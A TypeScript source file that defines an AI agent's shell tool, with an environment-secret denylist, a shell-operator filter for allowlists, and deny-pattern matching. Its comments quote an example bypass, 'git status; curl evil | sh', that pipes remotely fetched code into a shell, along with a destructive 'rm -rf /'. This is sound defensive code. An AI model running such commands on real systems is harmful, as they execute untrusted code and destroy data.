import { z } from 'zod';
import type { AppConfig } from '../config/schema.js';
import type { ToolDefinition } from './types.js';
import { runCommandWithStreaming, resolveProcessStreamingConfig } from './process-runner.js';
import { runToolExecution } from './execution.js';

/**
 * Env keys the `sh` tool must NOT forward into spawned commands. Unlike the
 * agent-CLI denylist we KEEP PATH/HOME/NODE_* (a shell needs them to work) but
 * strip the app's own provider secrets + config-root redirects + generically
 * secret-shaped names so an arbitrary command the model runs can't read them.
 *
 * A denylist can't enumerate every possible secret var, so the patterns below
 * are deliberately broad (any key CONTAINING SECRET/PASSWORD/TOKEN/CREDENTIAL/
 * API_KEY, or ending in _KEY/_PAT, plus known provider + DB + registry names).
 * We prefer a broad denylist over a strict allowlist here because the `sh` tool
 * legitimately needs arbitrary user env (LANG, TERM, EDITOR, app-specific vars)
 * and an allowlist would silently break normal commands. Patterns support a
 * single leading/trailing `*` wildcard (case-insensitive).
 */
const SHELL_ENV_SECRET_DENYLIST = [
  '*SECRET*',
  '*PASSWORD*',
  '*PASSWD*',
  '*TOKEN*',
  '*CREDENTIAL*',
  '*API_KEY*',
  '*APIKEY*',
  '*ACCESS_KEY*',
  '*PRIVATE_KEY*',
  '*_KEY',
  '*_PAT',
  '*_BASE_URL',
  'DATABASE_URL',
  'ANTHROPIC_*',
  'OPENAI_*',
  'AWS_*',
  'AZURE_*',
  'GOOGLE_*',
  'GEMINI_*',
  'GITHUB_*',
  'GH_*',
  'NPM_*',
  'CODEX_HOME',
  'CLAUDE_CONFIG_DIR',
  'ANTHROPIC_CONFIG_DIR',
];

function envKeyMatches(key: string, pattern: string): boolean {
  const k = key.toUpperCase();
  const p = pattern.toUpperCase();
  const lead = p.startsWith('*');
  const trail = p.endsWith('*');
  const core = p.slice(lead ? 1 : 0, trail ? p.length - 1 : p.length);
  if (lead && trail) return k.includes(core);
  if (lead) return k.endsWith(core);
  if (trail) return k.startsWith(core);
  return k === core;
}

/** Return a copy of `env` with the app's secret-bearing keys removed. */
export function scrubShellEnv(env: NodeJS.ProcessEnv): NodeJS.ProcessEnv {
  const out: NodeJS.ProcessEnv = {};
  for (const [key, value] of Object.entries(env)) {
    if (SHELL_ENV_SECRET_DENYLIST.some((pat) => envKeyMatches(key, pat))) continue;
    out[key] = value;
  }
  return out;
}

/** Shell operators that let a matched command PREFIX chain to arbitrary commands.
 *  When a non-`*` allowlist is active we reject these so `allow:["git"]` can't be
 *  bypassed by `git status; curl evil | sh`. */
const SHELL_CONTROL_OPERATORS = /[;&|`\n\r]|\$\(|<\(|>\(|(^|[^&])&&|\|\|/;

function buildWildcardRegex(pattern: string): RegExp {
  // Escape all regex metacharacters except `*`, which we map to `.*` below.
  const escaped = pattern.replace(/[.+?^${}()|[\]\\]/g, '\\$&');
  return new RegExp('^' + escaped.replace(/\*/g, '.*') + '$');
}

/** Allow-pattern matching: anchored at the start of the command. A non-glob
 *  pattern must match up to a word/command boundary so `git` doesn't match
 *  `git-malicious`. */
function matchesAllowPattern(command: string, pattern: string): boolean {
  if (pattern === '*') return true;
  if (pattern.includes('*')) return buildWildcardRegex(pattern).test(command);
  const cmd = command.trimStart();
  if (!cmd.startsWith(pattern)) return false;
  // The char right after the matched prefix must be a boundary (end, whitespace,
  // or a shell separator) — not an identifier char that would make it a
  // different command (git → git-malicious).
  const next = cmd.charAt(pattern.length);
  return next === '' || /[\s;&|<>()]/.test(next);
}

/**
 * Deny-pattern matching: whitespace-normalized substring search anywhere in
 * the command. Deny semantics are intentionally broader than allow — a deny
 * of `rm -rf /` should still catch `sudo rm  -rf /` and `env X=1 rm -rf /`.
 * (This is best-effort; quoting/expansion can still evade textual matching.)
 */
function matchesDenyPattern(command: string, pattern: string): boolean {
  if (pattern === '*') return true;
  const normCommand = command.replace(/\s+/g, ' ');
  const normPattern = pattern.replace(/\s+/g, ' ');
  if (normPattern.includes('*')) return buildWildcardRegex(normPattern).test(normCommand);
  return normCommand.includes(normPattern);
}

export function isCommandAllowed(command: string, config: AppConfig): { allowed: boolean; reason?: string } {
  const shellConfig = config.tools.shell;
  if (!shellConfig.enabled) return { allowed: false, reason: 'Shell tool is disabled' };

  for (const pattern of shellConfig.denyPatterns) {
    if (matchesDenyPattern(command, pattern)) {
      return { allowed: false, reason: `Command matches deny pattern: ${pattern}` };
    }
  }

  if (shellConfig.allowPatterns.length > 0 && !shellConfig.allowPatterns.includes('*')) {
    // A restrictive allowlist is active. Reject shell control operators FIRST:
    // matchesAllowPattern anchors at the command start, but the command runs via
    // shell:true, so `git status; curl evil | sh` would match an allow of `git`
    // and then chain to arbitrary commands. With a non-`*` allowlist we require a
    // single simple command (no ; | & backtick $( <( >( newline).
    if (SHELL_CONTROL_OPERATORS.test(command)) {
      return {
        allowed: false,
        reason:
          'Command contains shell operators (;, |, &, `, $(...)) which are not permitted under the active allowlist',
      };
    }
    const allowed = shellConfig.allowPatterns.some((p) => matchesAllowPattern(command, p));
    if (!allowed) return { allowed: false, reason: 'Command does not match any allow pattern' };
  }

  return { allowed: true };
}

export function createShellTool(getConfig: () => AppConfig): ToolDefinition {
  return {
    name: 'sh',
    description:
      'Execute a shell command on the local machine. Returns stdout/stderr. Use for running programs, scripts, git commands, package managers, etc.',
    inputSchema: z.object({
      command: z.string().describe('The shell command to execute'),
      cwd: z.string().optional().describe('Working directory (defaults to home)'),
      timeout: z.number().optional().describe('Timeout in milliseconds'),
    }),
    execute: async (input, context) =>
      runToolExecution({
        context,
        run: async () => {
          const { command, cwd, timeout } = input as { command: string; cwd?: string; timeout?: number };
          const config = getConfig();

          const check = isCommandAllowed(command, config);
          if (!check.allowed) {
            return { error: check.reason, command, isError: true };
          }

          const streaming = resolveProcessStreamingConfig(config);
          const result = await runCommandWithStreaming({
            command,
            cwd: cwd || context.cwd || process.env.HOME,
            timeoutMs: timeout || config.tools.shell.timeout,
            // Scrub the app's own secrets (API keys / base URLs / config-root
            // redirects) out of the child env so an arbitrary command the model
            // runs can't exfiltrate them. PATH/HOME/NODE_* are kept so the shell
            // still works.
            env: scrubShellEnv(process.env),
            context,
            streaming,
          });

          const payload: Record<string, unknown> = {
            exitCode: result.exitCode,
            stdout: result.stdout,
            stderr: result.stderr,
          };

          if (result.timedOut) payload.error = 'Command timed out';
          if (result.cancelled) payload.error = 'Command cancelled';
          if (result.truncated) {
            payload.truncated = true;
            payload.stdoutTruncated = result.stdoutTruncated;
            payload.stderrTruncated = result.stderrTruncated;
            payload.totalStdoutBytes = result.totalStdoutBytes;
            payload.totalStderrBytes = result.totalStderrBytes;
          }
          if (result.modelStream) {
            payload.modelStream = result.modelStream;
          }

          return payload;
        },
      }),
  };
}
